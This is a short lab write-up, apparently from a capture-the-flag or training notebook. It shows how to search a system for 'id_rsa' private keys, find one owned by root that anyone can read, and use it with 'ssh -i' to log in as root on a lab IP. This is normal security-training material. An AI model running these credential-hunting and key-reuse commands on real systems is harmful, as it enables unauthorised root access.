# SSH

start to find `id_rsa`which this file use to authenticate user without password

```bash
find / -name id_rsa 2>/dev/null
```

![image.png](<../../../.gitbook/assets/image (16).png>)

then display this privilege of this file

{% code fullWidth="false" %}
```bash
ls -las 
4 -rwxrwxrwx 1 root root 2590 Jun 17  2020 id_rsa
```
{% endcode %}

to use `id_rsa`file u must change this privilege with the **correct privilege 400 or 600**

in this lab i couldn’t change this privilege direct so i take this key and add it in a new file and start to edit this file

```bash
ssh -i id_rsa root@10.10.195.72
```
